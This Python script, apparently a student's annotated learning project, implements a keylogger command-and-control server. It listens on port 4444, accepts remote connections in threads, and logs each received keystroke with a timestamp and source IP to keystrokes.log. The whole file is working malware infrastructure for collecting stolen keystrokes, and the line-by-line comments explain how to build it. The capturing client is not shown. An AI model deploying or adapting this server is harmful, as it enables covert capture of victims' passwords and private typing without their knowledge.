#!/usr/bin/env python3
import socket
import threading
from datetime import datetime

def client_handler(client_socket, address):
    ip = address[0]
    print(f"[+] Connection from {ip}")

    '''the server will create new dedicated socket for the client
    ,when the client will accept the connection'''
    
    try:
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            '''this command will receive the 1kb of data from the client 
            it pauses until the client sends something'''

            '''if the clients disconnects or sends nothing the loop returns an empty value and "if no data" statement is  true the loop breaks
            so: loops continues until the client disconnects '''

            
            keystroke = data.decode('utf-8', errors='ignore')
            '''the data will arrive in bytes so ".decode" will convert it to a string with "utf-8" encoding '''
            ''' "errors = ignore" means if some bytes cant be decoded just ignore them'''

            if keystroke.strip():
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                log_entry = f"[{timestamp}] [{ip}] {keystroke}"
                '''datetime.now gets the current time and strftime formats it to "2025-11-08 13:52:10" format'''
                '''the formatted line shows when and from which ip the key stroke was received'''
                
                with open("keystrokes.log", "a") as f:
                    f.write(log_entry)
                '''opens (or creates) the "keystrokes.log" file in append mode and writes the log entry to it
                every keystroke will be logged on a new line. this is where logging to a file happens'''
                
                print(f"[KEY] {ip}: {repr(keystroke)}")
                '''prints to the terminal what was recieved from the client in real time'''
                '''repr shows special characters like \n (new line)clearly'''
                
    except Exception as e:
        pass
    finally:
        client_socket.close()
        print(f"[-] {ip} disconnected")
    ''' the try and except catches any errors eg. if the client disconnects unexpectedly'''
    ''' finally block ensures the client socket is closed and a disconnection message os printed'''

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #creates a tcp (connection based) socket
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    #allows to reuse the same port after restart 
    
    try:
        s.bind(('0.0.0.0', 4444))
        #bind() tells the operating to associate this socket with a local address and a port number 
        #0.0.0.0 means listen on all available network interfaces and accept connections sent to any of the hosts addresses

        s.listen(5)
        print("[*] C2 Server listening on port 4444")
        #listen() puts the socket into server mode and specifies the maximum number of queued connections (5 here) kernel will contain
        #if back lof is full new connection attempts may be refused

        while True:
            client, address = s.accept()
            #accept() waits client to connect and pauses the program
            #when a client it connects it return a new socket used to communicate with the client and the client ip address eg.(60234, 192.168.100.6)
            #the client is now connected to the server and can send data

            threading.Thread(target=client_handler, args=(client, address), daemon=True).start()
            #creates a new thread to handle the client connection each one wil run independently using the client_handler function

    except KeyboardInterrupt:
        print("\n[!] Server stopped")
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        s.close()
# ensures the server socket "s" is closed when the program ends

if __name__ == "__main__":
    main()
    #It means: Only run the following code if this script is executed directly, not imported as a module.
